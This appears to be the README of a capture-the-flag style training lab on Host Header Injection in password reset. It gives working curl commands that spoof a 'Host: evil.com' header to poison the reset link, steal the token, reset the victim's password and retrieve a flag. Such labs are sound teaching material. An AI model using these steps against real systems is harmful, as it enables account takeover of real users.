🎯 Host Header Injection Lab

Educational cybersecurity lab demonstrating Host Header Injection vulnerabilities in password reset functionality.

🐳 Quick Start with Docker
```bash
# Clone the repository
git clone https://github.com/YourUsername/password-reset-lab.git
cd password-reset-lab

# Start with Docker Compose
docker-compose up -d

Access lab at: http://localhost:8080
Phase 1: Preparation (Browser)

1.  Open [http://localhost:8080](http://localhost:8080) in your browser.
2.  Observe the "Current Status of 'victim@example.com'" – it should show 'Current Password: original123'.
3.  Get your Browser's 'PHPSESSID': Open Developer Tools ('F12'), go to the "Application" tab (or "Storage"), then "Cookies" for 'http://localhost:8080'. Copy the value of the 'PHPSESSID' cookie. You will need this for the next step.

Phase 2: The Attack - Command Line

1.  Step 1: Poison the Reset Link & Get Token
    This command tricks the vulnerable app into generating a reset link pointing to 'evil.com' and reveals the token.
    ```bash
    curl -v -X POST http://localhost:8080/ \
      -H "Host: evil.com" \
      -d "email=victim@example.com&request_reset=1"
    ```
    Observe Verbose Output (`-v`):** Look for the line containing 'href="http://evil.com/?token=<TOKEN>"'.
    Copy the '<TOKEN>' value. This is your stolen password reset token.

2.  Step 2: Reset Password Using Stolen Token
    This command uses the stolen token to change the victim's password on the legitimate application.
    ```bash
    curl -X POST "http://localhost:8080/?token=<PASTE_YOUR_TOKEN_HERE>" \
      -H "Cookie: PHPSESSID=<PASTE_YOUR_BROWSER_PHPSESSID_HERE>" \
      -d "new_password=hacked"
    ```
    Replace '<PASTE_YOUR_TOKEN_HERE>' with the token you copied from Step 1.
    Replace '<PASTE_YOUR_BROWSER_PHPSESSID_HERE>' with the 'PHPSESSID' you copied from your browser in Phase 1.
    Observe Output: It should confirm "PASSWORD CHANGED!"

Phase 3: Account Takeover Verification (Browser)

1.  Hard Refresh [http://localhost:8080](http://localhost:8080) in your browser ('Ctrl+Shift+R' or 'Cmd+Shift+R').
2.  Observe: The "Current Status of 'victim@example.com'" should now display 'Current Password: hacked'. This confirms the attack was successful.
3.  Login with compromised credentials:
    Go to the "USER LOGIN" form on the page.
    Email: 'victim@example.com'
    Password: 'hacked'
    Click "LOGIN TO GET FLAG".
   Success: The 'THM{P455W0RD_R353T_3XPL01T3D}' FLAG should be displayed!
